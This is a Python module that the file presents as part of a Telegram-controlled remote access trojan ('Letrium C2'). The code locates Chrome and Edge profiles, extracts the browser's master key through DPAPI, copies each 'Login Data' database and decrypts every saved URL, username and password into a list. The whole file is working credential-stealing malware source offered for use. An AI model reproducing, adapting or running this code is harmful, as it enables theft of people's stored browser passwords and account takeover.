# Letrium C2 - Telegram RAT by cybermad
# Dont copy this code without permission
# Discord - https://discord.gg/RUc432Nc
# _          _        _                 
#| |        | |      (_)                
#| |     ___| |_ _ __ _ _   _ _ __ ___  
#| |    / _ \ __| '__| | | | | '_ ` _ \ 
#| |___|  __/ |_| |  | | |_| | | | | | |
#\_____/\___|\__|_|  |_|\__,_|_| |_| |_|



import os, json, base64, sqlite3, shutil
import win32crypt
from Cryptodome.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def encrypt(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            key_b64 = json.load(f)["os_crypt"]["encrypted_key"]
        key = base64.b64decode(key_b64)[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt(buff, key):
    try:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except:
            return ""

def ext():
    res = []
    for browser, base in PATHS.items():
        if not os.path.exists(base):
            continue
        key = encrypt(base)
        if not key:
            continue

        for profile in os.listdir(base):
            if not (profile == "Default" or profile.startswith("Profile")):
                continue
            db = os.path.join(base, profile, "Login Data")
            if not os.path.exists(db):
                continue
            tmp = os.path.join(os.getenv("TEMP"), "logindata_tmp.db")
            try:
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cur.fetchall():
                    if user or pwd:
                        pwd = decrypt(pwd, key)
                        res.append({
                            "browser": browser,
                            "profile": profile,
                            "url": url,
                            "username": user,
                            "password": pwd
                        })
                cur.close(); conn.close()
            except:
                pass
            finally:
                if os.path.exists(tmp):
                    os.remove(tmp)

    return res